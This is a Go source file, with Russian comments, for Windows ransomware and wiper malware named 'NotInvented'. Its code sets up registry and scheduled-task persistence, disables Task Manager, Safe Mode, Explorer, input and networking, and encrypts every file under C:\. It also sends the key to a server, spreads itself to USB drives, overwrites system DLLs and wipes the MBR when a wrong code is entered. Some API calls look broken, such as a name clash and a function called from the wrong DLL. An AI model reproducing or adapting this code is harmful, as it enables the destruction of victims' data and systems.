package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	key          = "thisis32bytekeyforencryption123" // Ключ шифрования
	undoCode     = "21122jam"                      // Код для отката
	ransomNote   = "C:\\RANSOM_NOTE.txt"          // Записка
	encryptedExt = ".encrypted"                    // Расширение
	serverURL    = "http://example.com/upload"     // URL сервера
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	blockInput       = user32.NewProc("BlockInput")
	messageBox       = user32.NewProc("MessageBoxW")
	getConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	showWindow       = kernel32.NewProc("ShowWindow")
)

func main() {
	hideWindow()

	// 1. Персистентность
	addToStartup()
	createScheduledTask()
	disableTaskManager()
	disableSafeMode()

	// 2. Блокировка системы
	killExplorer()
	go blockInput()
	go disableNetwork()

	// 3. Шифрование и отправка ключа
	go encryptFiles("C:\\")
	go sendKeyToServer()

	// 4. Самораспространение
	go spreadToUSB()

	// 5. Повреждение системы
	go corruptSystemFiles()

	// 6. Записка и окно
	createRansomNote()
	go showUndoWindow()

	// 7. Блокировка
	go lockSystem()

	time.Sleep(24 * time.Hour)
}

// Скрытие окна
func hideWindow() {
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

// Автозагрузка
func addToStartup() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return
	}
	defer k.Close()
	exePath, _ := os.Executable()
	k.SetStringValue("NotInvented", exePath)
}

// Планировщик задач
func createScheduledTask() {
	exePath, _ := os.Executable()
	cmd := fmt.Sprintf(`schtasks /create /tn "NotInvented" /tr "%s" /sc onlogon /rl highest /f`, exePath)
	exec.Command("cmd", "/C", cmd).Run()
}

// Отключение диспетчера задач
func disableTaskManager() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, registry.ALL_ACCESS)
	if err != nil {
		k, _ = registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, registry.ALL_ACCESS)
	}
	defer k.Close()
	k.SetDWordValue("DisableTaskMgr", 1)
}

// Отключение безопасного режима
func disableSafeMode() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\SafeBoot`, registry.ALL_ACCESS)
	if err == nil {
		k.DeleteKey("Minimal")
		k.DeleteKey("Network")
		k.Close()
	}
}

// Отключение Explorer
func killExplorer() {
	exec.Command("taskkill", "/F", "/IM", "explorer.exe").Run()
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.ALL_ACCESS)
	if err == nil {
		defer k.Close()
		k.SetStringValue("Shell", "")
	}
}

// Блокировка ввода
func blockInput() {
	blockInput.Call(1)
}

// Шифрование файлов
func encryptFiles(root string) {
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || strings.HasSuffix(path, encryptedExt) || path == ransomNote {
			return nil
		}
		encryptFile(path)
		return nil
	})
}

func encryptFile(filePath string) {
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	err = os.WriteFile(filePath+encryptedExt, ciphertext, 0644)
	if err == nil {
		os.Remove(filePath)
	}
}

// Дешифрование файлов
func decryptFiles(root string) {
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(path, encryptedExt) {
			return nil
		}
		decryptFile(path)
		return nil
	})
}

func decryptFile(filePath string) {
	ciphertext, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return
	}

	if len(ciphertext) < aes.BlockSize {
		return
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	originalPath := strings.TrimSuffix(filePath, encryptedExt)
	err = os.WriteFile(originalPath, ciphertext, 0644)
	if err == nil {
		os.Remove(filePath)
	}
}

// Отправка ключа на сервер
func sendKeyToServer() {
	data := fmt.Sprintf("key=%s", hex.EncodeToString([]byte(key)))
	http.Post(serverURL, "application/x-www-form-urlencoded", strings.NewReader(data))
}

// Самораспространение на USB
func spreadToUSB() {
	exePath, _ := os.Executable()
	for {
		drives := getUSBDrives()
		for _, drive := range drives {
			target := drive + "NotInvented.exe"
			data, _ := ioutil.ReadFile(exePath)
			ioutil.WriteFile(target, data, 0644)
			exec.Command("cmd", "/C", "attrib", "+h", "+s", target).Run()
		}
		time.Sleep(5 * time.Second)
	}
}

func getUSBDrives() []string {
	var drives []string
	for _, drive := range "DEFGHIJKLMNOPQRSTUVWXYZ" {
		path := string(drive) + ":\\"
		if _, err := os.Stat(path); err == nil {
			drives = append(drives, path)
		}
	}
	return drives
}

// Повреждение системных файлов
func corruptSystemFiles() {
	files := []string{
		"C:\\Windows\\System32\\ntdll.dll",
		"C:\\Windows\\System32\\kernel32.dll",
		"C:\\Windows\\System32\\user32.dll",
	}
	for _, file := range files {
		if _, err := os.Stat(file); err == nil {
			os.WriteFile(file, []byte("CORRUPTED"), 0644)
		}
	}
}

// Уничтожение MBR
func wipeMBR() {
	f, err := os.OpenFile("\\\\.\\PhysicalDrive0", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer f.Close()
	zeroes := make([]byte, 512) // Затираем первый сектор
	f.Write(zeroes)
}

// Записка
func createRansomNote() {
	note := `Ваши файлы зашифрованы, система заблокирована. Введите код "21122jam" в окне для восстановления. Неверный код уничтожит ваш ПК!`
	os.WriteFile(ransomNote, []byte(note), 0644)
}

// Окно для ввода кода
func showUndoWindow() {
	title := syscall.StringToUTF16Ptr("NotInvented")
	msg := syscall.StringToUTF16Ptr("Введите код для восстановления системы (ошибка = конец):")
	var input [256]uint16
	for {
		ret, _, _ := messageBox.Call(0, uintptr(unsafe.Pointer(msg)), uintptr(unsafe.Pointer(title)), 0x00000001|0x00001000)
		if ret == 1 {
			kernel32.NewProc("GetDlgItemTextW").Call(0, 0, uintptr(unsafe.Pointer(&input[0])), 256)
			entered := syscall.UTF16ToString(input[:])
			if entered == undoCode {
				undoVirus()
				break
			} else {
				wipeMBR() // Неверный код — уничтожение MBR
				exec.Command("shutdown", "/r", "/t", "0").Run() // Перезагрузка для эффекта
				break
			}
		}
		time.Sleep(1 * time.Second)
	}
}

// Отключение сети
func disableNetwork() {
	exec.Command("ipconfig", "/release").Run()
	exec.Command("netsh", "interface", "set", "interface", "Ethernet", "disable").Run()
}

// Блокировка системы
func lockSystem() {
	for {
		time.Sleep(1 * time.Second)
	}
}

// Полный откат
func undoVirus() {
	blockInput.Call(0)
	k, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.ALL_ACCESS)
	k.SetStringValue("Shell", "explorer.exe")
	k.Close()
	exec.Command("explorer.exe").Run()

	k, _ = registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	k.DeleteValue("NotInvented")
	k.Close()

	exec.Command("schtasks", "/delete", "/tn", "NotInvented", "/f").Run()

	k, _ = registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, registry.ALL_ACCESS)
	k.DeleteValue("DisableTaskMgr")
	k.Close()

	exec.Command("netsh", "interface", "set", "interface", "Ethernet", "enable").Run()
	exec.Command("ipconfig", "/renew").Run()

	decryptFiles("C:\\")
	os.Remove(ransomNote)

	exePath, _ := os.Executable()
	os.Remove(exePath)
	os.Exit(0)
}